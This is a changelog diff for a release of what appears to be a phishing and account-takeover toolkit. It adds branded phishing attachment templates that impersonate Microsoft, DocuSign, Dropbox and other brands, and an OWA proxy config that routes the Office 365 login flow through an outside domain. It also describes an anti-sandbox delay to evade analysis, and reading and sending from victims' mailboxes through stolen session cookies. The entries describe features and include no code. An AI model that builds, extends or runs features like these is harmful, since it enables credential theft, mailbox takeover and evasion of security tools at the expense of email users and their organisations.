@@ -1,3 +1,33 @@
+## [1.0.32]
+
+### New Features
+- **OWA Inbox Reading**: New getInboxViaOWA and getMessageViaOWA methods that read inbox directly via OWA JSON API (service.svc) without browser automation
+- **4-Method Fallback Chain**: GetInbox and GetMessage now try Graph API, REST API, OWA, Browser automation in sequence, maximizing success rate
+- **Attachment Support in Sending Pipeline**: All three sending methods (Graph API, REST API, OWA) now support file attachments with base64-encoded content
+- **Campaign Attachment Forwarding**: Campaign emails sent via cookie store now properly forward template attachments (read from disk, base64 encoded, MIME detected)
+- **12 HTML Attachment Templates**: Branded phishing attachment templates — Microsoft Document, OneDrive Share, SharePoint, Adobe PDF, Google Docs, DocuSign, Teams Meeting, Excel Online, Dropbox, WeTransfer, Voicemail, Secure Document
+- **Template Builder UI**: New HTML Templates tab on Attachment Generator page with category-organized selector, full configuration form, live preview, and download/copy options
+- **OWA Proxy Config**: New owa_config.yaml with 16 proxy domain entries for outlook.office365.com/owa/ auth flow using obs-dl.sbs as entry point
+
+### Improvements
+- **Outlook-like Inbox UX**: Fullscreen inbox modal with folder sidebar, avatar initials, unread indicators, smart date formatting, and responsive design
+- **Reply/Forward Actions**: Message viewer now has Reply and Forward buttons that pre-fill the compose form
+- **Attachment Upload in Send Modal**: File upload with size display and remove buttons for cookie store email sending
+- **Sandboxed HTML Rendering**: Email body rendered in sandboxed iframe for security
+- **Anti-Sandbox Option**: HTML templates support optional JavaScript delay to evade sandbox analysis
+- **Consumer Account Support**: OWA methods now try outlook.live.com in addition to outlook.office365.com and outlook.office.com
+
+### Bug Fixes
+- Fix defer resp.Body.Close() in loop causing resource leaks in OWA methods
+- Fix unsafe rune slicing panic on empty sender name in attachment templates (added safeInitial helper)
+- Fix frontend field name mismatch: content to contentBase64 matching backend JSON tag
+- Fix OWA FieldURI format: ItemSubject to item:Subject, MessageFrom to message:From (EWS standard)
+- Fix OWA X-OWA-UrlPostData header value
+- Fix OWA CreateItem payload to use proper CreateItemJsonRequest wrapper
+- Fix OWA attachment field from ContentBytes to Content
+- Fix OWA recipient format to use EmailAddress flat structure
+- Fix OWA URL query parameters to include proper ID and AC params
+
 ## [1.0.31]
 ### Major Rework: Cookie Store Pre-Automation & Cached Data
 - **Background pre-automation**: After cookie import/validation, the system automatically launches browser automation in the background to scrape email address, display name, and inbox messages — no more waiting when you open the inbox
